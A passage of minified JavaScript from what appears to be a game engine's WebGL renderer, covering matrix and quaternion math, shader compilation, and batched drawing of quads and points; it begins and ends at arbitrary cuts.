s=t[0],n=t[1],r=t[2],o=t[3],a=s+s,h=n+n,c=r+r,t=s*a,l=s*h;s*=c;var u=n*h;return n*=c,r*=c,a*=o,h*=o,o*=c,i[0]=1-(u+r),i[1]=l+o,i[2]=s-h,i[3]=0,i[4]=l-o,i[5]=1-(t+r),i[6]=n+a,i[7]=0,i[8]=s+h,i[9]=n-a,i[10]=1-(t+u),i[11]=0,i[12]=e[0],i[13]=e[1],i[14]=e[2],i[15]=1,i},mat4.str=function(t){return"["+t[0]+", "+t[1]+", "+t[2]+", "+t[3]+", "+t[4]+", "+t[5]+", "+t[6]+", "+t[7]+", "+t[8]+", "+t[9]+", "+t[10]+", "+t[11]+", "+t[12]+", "+t[13]+", "+t[14]+", "+t[15]+"]"},quat4.create=function(t){var e=new MatrixArray(4);return t&&(e[0]=t[0],e[1]=t[1],e[2]=t[2],e[3]=t[3]),e},quat4.set=function(t,e){return e[0]=t[0],e[1]=t[1],e[2]=t[2],e[3]=t[3],e},quat4.calculateW=function(t,e){var i=t[0],s=t[1],n=t[2];return e&&t!==e?(e[0]=i,e[1]=s,e[2]=n,e[3]=-Math.sqrt(Math.abs(1-i*i-s*s-n*n)),e):(t[3]=-Math.sqrt(Math.abs(1-i*i-s*s-n*n)),t)},quat4.inverse=function(t,e){return e&&t!==e?(e[0]=-t[0],e[1]=-t[1],e[2]=-t[2],e[3]=t[3],e):(t[0]*=-1,t[1]*=-1,t[2]*=-1,t)},quat4.length=function(t){var e=t[0],i=t[1],s=t[2],t=t[3];return Math.sqrt(e*e+i*i+s*s+t*t)},quat4.normalize=function(t,e){e=e||t;var i=t[0],s=t[1],n=t[2],r=t[3],t=Math.sqrt(i*i+s*s+n*n+r*r);return 0===t?(e[0]=0,e[1]=0,e[2]=0,e[3]=0):(t=1/t,e[0]=i*t,e[1]=s*t,e[2]=n*t,e[3]=r*t),e},quat4.multiply=function(t,e,i){i=i||t;var s=t[0],n=t[1],r=t[2],t=t[3],o=e[0],a=e[1],h=e[2],e=e[3];return i[0]=s*e+t*o+n*h-r*a,i[1]=n*e+t*a+r*o-s*h,i[2]=r*e+t*h+s*a-n*o,i[3]=t*e-s*o-n*a-r*h,i},quat4.multiplyVec3=function(t,e,i){i=i||e;var s=e[0],n=e[1],r=e[2],e=t[0],o=t[1],a=t[2],h=(t=t[3])*s+o*r-a*n,c=t*n+a*s-e*r,l=t*r+e*n-o*s,s=-e*s-o*n-a*r;return i[0]=h*t+s*-e+c*-a-l*-o,i[1]=c*t+s*-o+l*-e-h*-a,i[2]=l*t+s*-a+h*-o-c*-e,i},quat4.toMat3=function(t,e){e=e||mat3.create();var i=t[0],s=t[1],n=t[2],r=t[3],o=i+i,a=s+s,h=n+n,c=i*o,l=i*a;i*=h;t=s*a;return s*=h,n*=h,o*=r,a*=r,r*=h,e[0]=1-(t+n),e[1]=l+r,e[2]=i-a,e[3]=l-r,e[4]=1-(c+n),e[5]=s+o,e[6]=i+a,e[7]=s-o,e[8]=1-(c+t),e},quat4.toMat4=function(t,e){e=e||mat4.create();var i=t[0],s=t[1],n=t[2],r=t[3],o=i+i,a=s+s,h=n+n,c=i*o,l=i*a;i*=h;t=s*a;return s*=h,n*=h,o*=r,a*=r,r*=h,e[0]=1-(t+n),e[1]=l+r,e[2]=i-a,e[3]=0,e[4]=l-r,e[5]=1-(c+n),e[6]=s+o,e[7]=0,e[8]=i+a,e[9]=s-o,e[10]=1-(c+t),e[11]=0,e[12]=0,e[13]=0,e[14]=0,e[15]=1,e},quat4.slerp=function(t,e,i,s){s=s||t;var n,r,o=t[0]*e[0]+t[1]*e[1]+t[2]*e[2]+t[3]*e[3];return 1<=Math.abs(o)?(s!==t&&(s[0]=t[0],s[1]=t[1],s[2]=t[2],s[3]=t[3]),s):(n=Math.acos(o),r=Math.sqrt(1-o*o),Math.abs(r)<.001?(s[0]=.5*t[0]+.5*e[0],s[1]=.5*t[1]+.5*e[1],s[2]=.5*t[2]+.5*e[2],s[3]=.5*t[3]+.5*e[3]):(o=Math.sin((1-i)*n)/r,i=Math.sin(i*n)/r,s[0]=t[0]*o+e[0]*i,s[1]=t[1]*o+e[1]*i,s[2]=t[2]*o+e[2]*i,s[3]=t[3]*o+e[3]*i),s)},quat4.str=function(t){return"["+t[0]+", "+t[1]+", "+t[2]+", "+t[3]+"]"},function(){var i=mat4.create();function t(t,e,i){this.isIE=/msie/i.test(navigator.userAgent)||/trident/i.test(navigator.userAgent),this.width=0,this.height=0,this.enableFrontToBack=!!i,this.isEarlyZPass=!1,this.isBatchInEarlyZPass=!1,this.currentZ=0,this.zNear=1,this.zFar=1e3,this.zIncrement=(this.zFar-this.zNear)/32768,this.zA=this.zFar/(this.zFar-this.zNear),this.zB=this.zFar*this.zNear/(this.zNear-this.zFar),this.kzA=65536*this.zA,this.kzB=65536*this.zB,this.cam=vec3.create([0,0,100]),this.look=vec3.create([0,0,0]),this.up=vec3.create([0,1,0]),this.worldScale=vec3.create([1,1,1]),this.enable_mipmaps=!0,this.matP=mat4.create(),this.matMV=mat4.create(),this.lastMV=mat4.create(),this.currentMV=mat4.create(),this.gl=t,this.version=0===this.gl.getParameter(this.gl.VERSION).indexOf("WebGL 2")?2:1,this.initState()}function u(t,e,i){this.gl=t,this.shaderProgram=e,this.name=i,this.locAPos=t.getAttribLocation(e,"aPos"),this.locATex=t.getAttribLocation(e,"aTex"),this.locMatP=t.getUniformLocation(e,"matP"),this.locMatMV=t.getUniformLocation(e,"matMV"),this.locOpacity=t.getUniformLocation(e,"opacity"),this.locColorFill=t.getUniformLocation(e,"colorFill"),this.locSamplerFront=t.getUniformLocation(e,"samplerFront"),this.locSamplerBack=t.getUniformLocation(e,"samplerBack"),this.locDestStart=t.getUniformLocation(e,"destStart"),this.locDestEnd=t.getUniformLocation(e,"destEnd"),this.locSeconds=t.getUniformLocation(e,"seconds"),this.locPixelWidth=t.getUniformLocation(e,"pixelWidth"),this.locPixelHeight=t.getUniformLocation(e,"pixelHeight"),this.locLayerScale=t.getUniformLocation(e,"layerScale"),this.locLayerAngle=t.getUniformLocation(e,"layerAngle"),this.locViewOrigin=t.getUniformLocation(e,"viewOrigin"),this.locScrollPos=t.getUniformLocation(e,"scrollPos"),this.hasAnyOptionalUniforms=!!(this.locPixelWidth||this.locPixelHeight||this.locSeconds||this.locSamplerBack||this.locDestStart||this.locDestEnd||this.locLayerScale||this.locLayerAngle||this.locViewOrigin||this.locScrollPos),this.lpPixelWidth=-999,this.lpPixelHeight=-999,this.lpOpacity=1,this.lpDestStartX=0,this.lpDestStartY=0,this.lpDestEndX=1,this.lpDestEndY=1,this.lpLayerScale=1,this.lpLayerAngle=0,this.lpViewOriginX=0,this.lpViewOriginY=0,this.lpScrollPosX=0,this.lpScrollPosY=0,this.lpSeconds=0,this.lastCustomParams=[],this.lpMatMV=mat4.create(),this.locOpacity&&t.uniform1f(this.locOpacity,1),this.locColorFill&&t.uniform4f(this.locColorFill,1,1,1,1),this.locSamplerFront&&t.uniform1i(this.locSamplerFront,0),this.locSamplerBack&&t.uniform1i(this.locSamplerBack,1),this.locDestStart&&t.uniform2f(this.locDestStart,0,0),this.locDestEnd&&t.uniform2f(this.locDestEnd,1,1),this.locLayerScale&&t.uniform1f(this.locLayerScale,1),this.locLayerAngle&&t.uniform1f(this.locLayerAngle,0),this.locViewOrigin&&t.uniform2f(this.locViewOrigin,0,0),this.locScrollPos&&t.uniform2f(this.locScrollPos,0,0),this.locSeconds&&t.uniform1f(this.locSeconds,0),this.hasCurrentMatMV=!1}function e(t,e){return t[0]===e[0]&&t[1]===e[1]&&t[2]===e[2]&&t[3]===e[3]&&t[4]===e[4]&&t[5]===e[5]&&t[6]===e[6]&&t[7]===e[7]&&t[8]===e[8]&&t[9]===e[9]&&t[10]===e[10]&&t[11]===e[11]&&t[12]===e[12]&&t[13]===e[13]&&t[14]===e[14]&&t[15]===e[15]}function s(t,e){this.type=t,this.glwrap=e,this.gl=e.gl,this.opacityParam=0,this.startIndex=0,this.indexCount=0,this.texParam=null,this.mat4param=null,this.shaderParams=[],cr.seal(this)}t.prototype.initState=function(){var t=this.gl;for(this.lastOpacity=1,this.lastTexture0=null,this.lastTexture1=null,this.currentOpacity=1,t.clearColor(0,0,0,0),t.clear(t.COLOR_BUFFER_BIT),t.enable(t.BLEND),t.blendFunc(t.ONE,t.ONE_MINUS_SRC_ALPHA),t.disable(t.CULL_FACE),t.disable(t.STENCIL_TEST),t.disable(t.DITHER),this.enableFrontToBack?(t.enable(t.DEPTH_TEST),t.depthFunc(t.LEQUAL)):t.disable(t.DEPTH_TEST),this.maxTextureSize=t.getParameter(t.MAX_TEXTURE_SIZE),this.lastSrcBlend=t.ONE,this.lastDestBlend=t.ONE_MINUS_SRC_ALPHA,this.vertexData=new Float32Array(8e3*(this.enableFrontToBack?3:2)),this.texcoordData=new Float32Array(16e3),this.pointData=new Float32Array(32e3),this.pointBuffer=t.createBuffer(),t.bindBuffer(t.ARRAY_BUFFER,this.pointBuffer),t.bufferData(t.ARRAY_BUFFER,this.pointData.byteLength,t.DYNAMIC_DRAW),this.vertexBuffers=new Array(4),this.texcoordBuffers=new Array(4),n=0;n<4;n++)this.vertexBuffers[n]=t.createBuffer(),t.bindBuffer(t.ARRAY_BUFFER,this.vertexBuffers[n]),t.bufferData(t.ARRAY_BUFFER,this.vertexData.byteLength,t.DYNAMIC_DRAW),this.texcoordBuffers[n]=t.createBuffer(),t.bindBuffer(t.ARRAY_BUFFER,this.texcoordBuffers[n]),t.bufferData(t.ARRAY_BUFFER,this.texcoordData.byteLength,t.DYNAMIC_DRAW);this.curBuffer=0,this.indexBuffer=t.createBuffer(),t.bindBuffer(t.ELEMENT_ARRAY_BUFFER,this.indexBuffer);for(var e,i,s=new Uint16Array(12e3),n=0,r=0;n<12e3;)s[n++]=r,s[n++]=r+1,s[n++]=r+2,s[n++]=r,s[n++]=r+2,s[n++]=r+3,r+=4;t.bufferData(t.ELEMENT_ARRAY_BUFFER,s,t.STATIC_DRAW),this.vertexPtr=0,this.texPtr=0,this.pointPtr=0,this.shaderPrograms=[],e=["varying mediump vec2 vTex;","uniform lowp float opacity;","uniform lowp sampler2D samplerFront;","void main(void) {","\tgl_FragColor = texture2D(samplerFront, vTex);","\tgl_FragColor *= opacity;","}"].join("\n"),i=(this.enableFrontToBack?["attribute highp vec3 aPos;","attribute mediump vec2 aTex;","varying mediump vec2 vTex;","uniform highp mat4 matP;","uniform highp mat4 matMV;","void main(void) {","\tgl_Position = matP * matMV * vec4(aPos.x, aPos.y, aPos.z, 1.0);","\tvTex = aTex;","}"]:["attribute highp vec2 aPos;","attribute mediump vec2 aTex;","varying mediump vec2 vTex;","uniform highp mat4 matP;","uniform highp mat4 matMV;","void main(void) {","\tgl_Position = matP * matMV * vec4(aPos.x, aPos.y, 0.0, 1.0);","\tvTex = aTex;","}"]).join("\n");var o=this.createShaderProgram({src:e},i,"<default>");this.shaderPrograms.push(o),e=["uniform mediump sampler2D samplerFront;","varying lowp float opacity;","void main(void) {","\tgl_FragColor = texture2D(samplerFront, gl_PointCoord);","\tgl_FragColor *= opacity;","}"].join("\n");var a=["attribute vec4 aPos;","varying float opacity;","uniform mat4 matP;","uniform mat4 matMV;","void main(void) {","\tgl_Position = matP * matMV * vec4(aPos.x, aPos.y, 0.0, 1.0);","\tgl_PointSize = aPos.z;","\topacity = aPos.w;","}"].join("\n");o=this.createShaderProgram({src:e},a,"<point>"),this.shaderPrograms.push(o),e=["varying mediump vec2 vTex;","uniform lowp sampler2D samplerFront;","void main(void) {","\tif (texture2D(samplerFront, vTex).a < 1.0)","\t\tdiscard;","}"].join("\n");o=this.createShaderProgram({src:e},i,"<earlyz>");this.shaderPrograms.push(o),e=["uniform lowp vec4 colorFill;","void main(void) {","\tgl_FragColor = colorFill;","}"].join("\n");var h,o=this.createShaderProgram({src:e},i,"<fill>");for(h in this.shaderPrograms.push(o),cr.shaders)cr.shaders.hasOwnProperty(h)&&this.shaderPrograms.push(this.createShaderProgram(cr.shaders[h],i,h));t.activeTexture(t.TEXTURE0),t.bindTexture(t.TEXTURE_2D,null),this.batch=[],this.batchPtr=0,this.hasQuadBatchTop=!1,this.hasPointBatchTop=!1,this.lastProgram=-1,this.currentProgram=-1,this.currentShader=null,this.fbo=t.createFramebuffer(),this.renderToTex=null,this.depthBuffer=null,this.attachedDepthBuffer=!1,this.enableFrontToBack&&(this.depthBuffer=t.createRenderbuffer()),this.tmpVec3=vec3.create([0,0,0]);o=t.getParameter(t.ALIASED_POINT_SIZE_RANGE);this.minPointSize=o[0],this.maxPointSize=o[1],2048<this.maxPointSize&&(this.maxPointSize=2048),this.switchProgram(0),cr.seal(this)},u.prototype.updateMatMV=function(t){e(this.lpMatMV,t)||(mat4.set(t,this.lpMatMV),this.gl.uniformMatrix4fv(this.locMatMV,!1,t))},t.prototype.createShaderProgram=function(t,e,i){var s=this.gl,n=s.createShader(s.FRAGMENT_SHADER);if(s.shaderSource(n,t.src),s.compileShader(n),!s.getShaderParameter(n,s.COMPILE_STATUS)){var r=s.getShaderInfoLog(n);throw s.deleteShader(n),new Error("error compiling fragment shader: "+r)}var o=s.createShader(s.VERTEX_SHADER);if(s.shaderSource(o,e),s.compileShader(o),!s.getShaderParameter(o,s.COMPILE_STATUS)){r=s.getShaderInfoLog(o);throw s.deleteShader(n),s.deleteShader(o),new Error("error compiling vertex shader: "+r)}var a=s.createProgram();if(s.attachShader(a,n),s.attachShader(a,o),s.linkProgram(a),!s.getProgramParameter(a,s.LINK_STATUS)){r=s.getProgramInfoLog(a);throw s.deleteShader(n),s.deleteShader(o),s.deleteProgram(a),new Error("error linking shader program: "+r)}s.useProgram(a),s.deleteShader(n),s.deleteShader(o);var h,c,l=new u(s,a,i);for(l.extendBoxHorizontal=t.extendBoxHorizontal||0,l.extendBoxVertical=t.extendBoxVertical||0,l.crossSampling=!!t.crossSampling,l.preservesOpaqueness=!!t.preservesOpaqueness,l.animated=!!t.animated,l.parameters=t.parameters||[],h=0,c=l.parameters.length;h<c;h++)l.parameters[h][1]=s.getUniformLocation(a,l.parameters[h][0]),l.lastCustomParams.push(0),s.uniform1f(l.parameters[h][1],0);return cr.seal(l),l},t.prototype.getShaderIndex=function(t){for(var e=0,i=this.shaderPrograms.length;e<i;e++)if(this.shaderPrograms[e].name===t)return e;return-1},t.prototype.project=function(t,e,i){var s=this.matMV,n=this.matP,r=[0,0,0,0,0,0,0,0];r[0]=s[0]*t+s[4]*e+s[12],r[1]=s[1]*t+s[5]*e+s[13],r[2]=s[2]*t+s[6]*e+s[14],r[3]=s[3]*t+s[7]*e+s[15],r[4]=n[0]*r[0]+n[4]*r[1]+n[8]*r[2]+n[12]*r[3],r[5]=n[1]*r[0]+n[5]*r[1]+n[9]*r[2]+n[13]*r[3],r[6]=n[2]*r[0]+n[6]*r[1]+n[10]*r[2]+n[14]*r[3],r[7]=-r[2],0!==r[7]&&(r[7]=1/r[7],r[4]*=r[7],r[5]*=r[7],r[6]*=r[7],i[0]=(.5*r[4]+.5)*this.width,i[1]=(.5*r[5]+.5)*this.height)},t.prototype.setSize=function(t,e,i){if(this.width!==t||this.height!==e||i){this.endBatch();var s,n,r,o=this.gl;for(this.width=t,this.height=e,o.viewport(0,0,t,e),mat4.lookAt(this.cam,this.look,this.up,this.matMV),this.enableFrontToBack?(mat4.ortho(-t/2,t/2,e/2,-e/2,this.zNear,this.zFar,this.matP),this.worldScale[0]=1,this.worldScale[1]=1):(mat4.perspective(45,t/e,this.zNear,this.zFar,this.matP),t=[0,0],e=[0,0],this.project(0,0,t),this.project(1,1,e),this.worldScale[0]=1/(e[0]-t[0]),this.worldScale[1]=-1/(e[1]-t[1])),s=0,n=this.shaderPrograms.length;s<n;s++)(r=this.shaderPrograms[s]).hasCurrentMatMV=!1,r.locMatP&&(o.useProgram(r.shaderProgram),o.uniformMatrix4fv(r.locMatP,!1,this.matP));o.useProgram(this.shaderPrograms[this.lastProgram].shaderProgram),o.bindTexture(o.TEXTURE_2D,null),o.activeTexture(o.TEXTURE1),o.bindTexture(o.TEXTURE_2D,null),o.activeTexture(o.TEXTURE0),this.lastTexture0=null,this.lastTexture1=null,this.depthBuffer&&(o.bindFramebuffer(o.FRAMEBUFFER,this.fbo),o.bindRenderbuffer(o.RENDERBUFFER,this.depthBuffer),o.renderbufferStorage(o.RENDERBUFFER,o.DEPTH_COMPONENT16,this.width,this.height),this.attachedDepthBuffer||(o.framebufferRenderbuffer(o.FRAMEBUFFER,o.DEPTH_ATTACHMENT,o.RENDERBUFFER,this.depthBuffer),this.attachedDepthBuffer=!0),o.bindRenderbuffer(o.RENDERBUFFER,null),o.bindFramebuffer(o.FRAMEBUFFER,null),this.renderToTex=null)}},t.prototype.resetModelView=function(){mat4.lookAt(this.cam,this.look,this.up,this.matMV),mat4.scale(this.matMV,this.worldScale)},t.prototype.translate=function(t,e){0===t&&0===e||(this.tmpVec3[0]=t,this.tmpVec3[1]=e,this.tmpVec3[2]=0,mat4.translate(this.matMV,this.tmpVec3))},t.prototype.scale=function(t,e){1===t&&1===e||(this.tmpVec3[0]=t,this.tmpVec3[1]=e,this.tmpVec3[2]=1,mat4.scale(this.matMV,this.tmpVec3))},t.prototype.rotateZ=function(t){0!==t&&mat4.rotateZ(this.matMV,t)},t.prototype.updateModelView=function(){var t;e(this.lastMV,this.matMV)||((t=this.pushBatch()).type=5,t.mat4param?mat4.set(this.matMV,t.mat4param):t.mat4param=mat4.create(this.matMV),mat4.set(this.matMV,this.lastMV),this.hasQuadBatchTop=!1,this.hasPointBatchTop=!1)},t.prototype.setEarlyZIndex=function(t){this.enableFrontToBack&&(32760<t&&(t=32760),this.currentZ=this.cam[2]-this.zNear-t*this.zIncrement)},s.prototype.doSetEarlyZPass=function(){var t=this.gl,e=this.glwrap;0!==this.startIndex?(t.depthMask(!0),t.colorMask(!1,!1,!1,!1),t.disable(t.BLEND),t.bindFramebuffer(t.FRAMEBUFFER,e.fbo),t.framebufferTexture2D(t.FRAMEBUFFER,t.COLOR_ATTACHMENT0,t.TEXTURE_2D,null,0),t.clear(t.DEPTH_BUFFER_BIT),t.bindFramebuffer(t.FRAMEBUFFER,null),e.isBatchInEarlyZPass=!0):(t.depthMask(!1),t.colorMask(!0,!0,!0,!0),t.enable(t.BLEND),e.isBatchInEarlyZPass=!1)},s.prototype.doSetTexture=function(){this.gl.bindTexture(this.gl.TEXTURE_2D,this.texParam)},s.prototype.doSetTexture1=function(){var t=this.gl;t.activeTexture(t.TEXTURE1),t.bindTexture(t.TEXTURE_2D,this.texParam),t.activeTexture(t.TEXTURE0)},s.prototype.doSetOpacity=function(){var t=this.opacityParam,e=this.glwrap;e.currentOpacity=t;e=e.currentShader;e.locOpacity&&e.lpOpacity!==t&&(e.lpOpacity=t,this.gl.uniform1f(e.locOpacity,t))},s.prototype.doQuad=function(){this.gl.drawElements(this.gl.TRIANGLES,this.indexCount,this.gl.UNSIGNED_SHORT,this.startIndex)},s.prototype.doSetBlend=function(){this.gl.blendFunc(this.startIndex,this.indexCount)},s.prototype.doUpdateModelView=function(){for(var t,e=this.glwrap.shaderPrograms,i=this.glwrap.currentProgram,s=0,n=e.length;s<n;s++)t=e[s],s===i&&t.locMatMV?(t.updateMatMV(this.mat4param),t.hasCurrentMatMV=!0):t.hasCurrentMatMV=!1;mat4.set(this.mat4param,this.glwrap.currentMV)},s.prototype.doRenderToTexture=function(){var t=this.gl,e=this.glwrap;this.texParam?(e.lastTexture1===this.texParam&&(t.activeTexture(t.TEXTURE1),t.bindTexture(t.TEXTURE_2D,null),e.lastTexture1=null,t.activeTexture(t.TEXTURE0)),t.bindFramebuffer(t.FRAMEBUFFER,e.fbo),e.isBatchInEarlyZPass||t.framebufferTexture2D(t.FRAMEBUFFER,t.COLOR_ATTACHMENT0,t.TEXTURE_2D,this.texParam,0)):(e.enableFrontToBack||t.framebufferTexture2D(t.FRAMEBUFFER,t.COLOR_ATTACHMENT0,t.TEXTURE_2D,null,0),t.bindFramebuffer(t.FRAMEBUFFER,null))},s.prototype.doClear=function(){var t=this.gl,e=this.startIndex;0===e?(t.clearColor(this.mat4param[0],this.mat4param[1],this.mat4param[2],this.mat4param[3]),t.clear(t.COLOR_BUFFER_BIT)):1===e?(t.enable(t.SCISSOR_TEST),t.scissor(this.mat4param[0],this.mat4param[1],this.mat4param[2],this.mat4param[3]),t.clearColor(0,0,0,0),t.clear(t.COLOR_BUFFER_BIT),t.disable(t.SCISSOR_TEST)):t.clear(t.DEPTH_BUFFER_BIT)},s.prototype.doSetDepthTestEnabled=function(){var t=this.gl;0!==this.startIndex?t.enable(t.DEPTH_TEST):t.disable(t.DEPTH_TEST)},s.prototype.doPoints=function(){var t=this.gl,e=this.glwrap;e.enableFrontToBack&&t.disable(t.DEPTH_TEST);var i=e.shaderPrograms[1];t.useProgram(i.shaderProgram),!i.hasCurrentMatMV&&i.locMatMV&&(i.updateMatMV(e.currentMV),i.hasCurrentMatMV=!0),t.enableVertexAttribArray(i.locAPos),t.bindBuffer(t.ARRAY_BUFFER,e.pointBuffer),t.vertexAttribPointer(i.locAPos,4,t.FLOAT,!1,0,0),t.drawArrays(t.POINTS,this.startIndex/4,this.indexCount),i=e.currentShader,t.useProgram(i.shaderProgram),0<=i.locAPos&&(t.enableVertexAttribArray(i.locAPos),t.bindBuffer(t.ARRAY_BUFFER,e.vertexBuffers[e.curBuffer]),t.vertexAttribPointer(i.locAPos,e.enableFrontToBack?3:2,t.FLOAT,!1,0,0)),0<=i.locATex&&(t.enableVertexAttribArray(i.locATex),t.bindBuffer(t.ARRAY_BUFFER,e.texcoordBuffers[e.curBuffer]),t.vertexAttribPointer(i.locATex,2,t.FLOAT,!1,0,0)),e.enableFrontToBack&&t.enable(t.DEPTH_TEST)},s.prototype.doSetProgram=function(){var t=this.gl,e=this.glwrap,i=e.shaderPrograms[this.startIndex];e.currentProgram=this.startIndex,e.currentShader=i,t.useProgram(i.shaderProgram),!i.hasCurrentMatMV&&i.locMatMV&&(i.updateMatMV(e.currentMV),i.hasCurrentMatMV=!0),i.locOpacity&&i.lpOpacity!==e.currentOpacity&&(i.lpOpacity=e.currentOpacity,t.uniform1f(i.locOpacity,e.currentOpacity)),0<=i.locAPos&&(t.enableVertexAttribArray(i.locAPos),t.bindBuffer(t.ARRAY_BUFFER,e.vertexBuffers[e.curBuffer]),t.vertexAttribPointer(i.locAPos,e.enableFrontToBack?3:2,t.FLOAT,!1,0,0)),0<=i.locATex&&(t.enableVertexAttribArray(i.locATex),t.bindBuffer(t.ARRAY_BUFFER,e.texcoordBuffers[e.curBuffer]),t.vertexAttribPointer(i.locATex,2,t.FLOAT,!1,0,0))},s.prototype.doSetColor=function(){var t=this.glwrap.currentShader,e=this.mat4param;this.gl.uniform4f(t.locColorFill,e[0],e[1],e[2],e[3])},s.prototype.doSetProgramParameters=function(){var t,e,i=this.glwrap.currentShader,s=this.gl,n=this.mat4param;i.locSamplerBack&&this.glwrap.lastTexture1!==this.texParam&&(s.activeTexture(s.TEXTURE1),s.bindTexture(s.TEXTURE_2D,this.texParam),this.glwrap.lastTexture1=this.texParam,s.activeTexture(s.TEXTURE0));var r,o=n[0];if(i.locPixelWidth&&o!==i.lpPixelWidth&&(i.lpPixelWidth=o,s.uniform1f(i.locPixelWidth,o)),o=n[1],i.locPixelHeight&&o!==i.lpPixelHeight&&(i.lpPixelHeight=o,s.uniform1f(i.locPixelHeight,o)),o=n[2],r=n[3],!i.locDestStart||o===i.lpDestStartX&&r===i.lpDestStartY||(i.lpDestStartX=o,i.lpDestStartY=r,s.uniform2f(i.locDestStart,o,r)),o=n[4],r=n[5],!i.locDestEnd||o===i.lpDestEndX&&r===i.lpDestEndY||(i.lpDestEndX=o,i.lpDestEndY=r,s.uniform2f(i.locDestEnd,o,r)),o=n[6],i.locLayerScale&&o!==i.lpLayerScale&&(i.lpLayerScale=o,s.uniform1f(i.locLayerScale,o)),o=n[7],i.locLayerAngle&&o!==i.lpLayerAngle&&(i.lpLayerAngle=o,s.uniform1f(i.locLayerAngle,o)),o=n[8],r=n[9],!i.locViewOrigin||o===i.lpViewOriginX&&r===i.lpViewOriginY||(i.lpViewOriginX=o,i.lpViewOriginY=r,s.uniform2f(i.locViewOrigin,o,r)),o=n[10],r=n[11],!i.locScrollPos||o===i.lpScrollPosX&&r===i.lpScrollPosY||(i.lpScrollPosX=o,i.lpScrollPosY=r,s.uniform2f(i.locScrollPos,o,r)),o=n[12],i.locSeconds&&o!==i.lpSeconds&&(i.lpSeconds=o,s.uniform1f(i.locSeconds,o)),i.parameters.length)for(t=0,e=i.parameters.length;t<e;t++)(o=this.shaderParams[t])!==i.lastCustomParams[t]&&(i.lastCustomParams[t]=o,s.uniform1f(i.parameters[t][1],o))},t.prototype.pushBatch=function(){return this.batchPtr===this.batch.length&&this.batch.push(new s(0,this)),this.batch[this.batchPtr++]},t.prototype.endBatch=function(){if(0!==this.batchPtr&&!this.gl.isContextLost()){var t,e,i,s,n=this.gl;for(0<this.pointPtr&&(n.bindBuffer(n.ARRAY_BUFFER,this.pointBuffer),n.bufferSubData(n.ARRAY_BUFFER,0,this.pointData.subarray(0,this.pointPtr)),t&&0<=t.locAPos&&"<point>"===t.name&&n.vertexAttribPointer(t.locAPos,4,n.FLOAT,!1,0,0)),0<this.vertexPtr&&(t=this.currentShader,n.bindBuffer(n.ARRAY_BUFFER,this.vertexBuffers[this.curBuffer]),n.bufferSubData(n.ARRAY_BUFFER,0,this.vertexData.subarray(0,this.vertexPtr)),t&&0<=t.locAPos&&"<point>"!==t.name&&n.vertexAttribPointer(t.locAPos,this.enableFrontToBack?3:2,n.FLOAT,!1,0,0),n.bindBuffer(n.ARRAY_BUFFER,this.texcoordBuffers[this.curBuffer]),n.bufferSubData(n.ARRAY_BUFFER,0,this.texcoordData.subarray(0,this.texPtr)),t&&0<=t.locATex&&"<point>"!==t.name&&n.vertexAttribPointer(t.locATex,2,n.FLOAT,!1,0,0)),e=0,i=this.batchPtr;e<i;e++)switch((s=this.batch[e]).type){case 1:s.doQuad();break;case 2:s.doSetTexture();break;case 3:s.doSetOpacity();break;case 4:s.doSetBlend();break;case 5:s.doUpdateModelView();break;case 6:s.doRenderToTexture();break;case 7:s.doClear();break;case 8:s.doPoints();break;case 9:s.doSetProgram();break;case 10:s.doSetProgramParameters();break;case 11:s.doSetTexture1();break;case 12:s.doSetColor();break;case 13:s.doSetDepthTestEnabled();break;case 14:s.doSetEarlyZPass()}this.batchPtr=0,this.vertexPtr=0,this.texPtr=0,this.pointPtr=0,this.hasQuadBatchTop=!1,this.hasPointBatchTop=!1,this.isBatchInEarlyZPass=!1,this.curBuffer++,4<=this.curBuffer&&(this.curBuffer=0)}},t.prototype.setOpacity=function(t){var e;t!==this.lastOpacity&&(this.isEarlyZPass||((e=this.pushBatch()).type=3,e.opacityParam=t,this.lastOpacity=t,this.hasQuadBatchTop=!1,this.hasPointBatchTop=!1))},t.prototype.setTexture=function(t){var e;t!==this.lastTexture0&&((e=this.pushBatch()).type=2,e.texParam=t,this.lastTexture0=t,this.hasQuadBatchTop=!1,this.hasPointBatchTop=!1)},t.prototype.setBlend=function(t,e){var i;t===this.lastSrcBlend&&e===this.lastDestBlend||this.isEarlyZPass||((i=this.pushBatch()).type=4,i.startIndex=t,i.indexCount=e,this.lastSrcBlend=t,this.lastDestBlend=e,this.hasQuadBatchTop=!1,this.hasPointBatchTop=!1)},t.prototype.isPremultipliedAlphaBlend=function(){return this.lastSrcBlend===this.gl.ONE&&this.lastDestBlend===this.gl.ONE_MINUS_SRC_ALPHA},t.prototype.setAlphaBlend=function(){this.setBlend(this.gl.ONE,this.gl.ONE_MINUS_SRC_ALPHA)},t.prototype.setNoPremultiplyAlphaBlend=function(){this.setBlend(this.gl.SRC_ALPHA,this.gl.ONE_MINUS_SRC_ALPHA)},t.prototype.quad=function(t,e,i,s,n,r,o,a){15992<=this.vertexPtr&&this.endBatch();var h,c=this.vertexPtr,l=this.texPtr,u=this.vertexData,p=this.texcoordData,d=this.currentZ;this.hasQuadBatchTop?this.batch[this.batchPtr-1].indexCount+=6:((h=this.pushBatch()).type=1,h.startIndex=this.enableFrontToBack?c:c/2*3,h.indexCount=6,this.hasQuadBatchTop=!0,this.hasPointBatchTop=!1),this.enableFrontToBack?(u[c++]=t,u[c++]=e,u[c++]=d,u[c++]=i,u[c++]=s,u[c++]=d,u[c++]=n,u[c++]=r,u[c++]=d,u[c++]=o,u[c++]=a,u[c++]=d):(u[c++]=t,u[c++]=e,u[c++]=i,u[c++]=s,u[c++]=n,u[c++]=r,u[c++]=o,u[c++]=a),p[l++]=0,p[l++]=0,p[l++]=1,p[l++]=0,p[l++]=1,p[l++]=1,p[l++]=0,p[l++]=1,this.vertexPtr=c,this.texPtr=l},t.prototype.quadTex=function(t,e,i,s,n,r,o,a,h){15992<=this.vertexPtr&&this.endBatch();var c=this.vertexPtr,l=this.texPtr,u=this.vertexData,p=this.texcoordData,d=this.currentZ;this.hasQuadBatchTop?this.batch[this.batchPtr-1].indexCount+=6:((m=this.pushBatch()).type=1,m.startIndex=this.enableFrontToBack?c:c/2*3,m.indexCount=6,this.hasQuadBatchTop=!0,this.hasPointBatchTop=!1);var 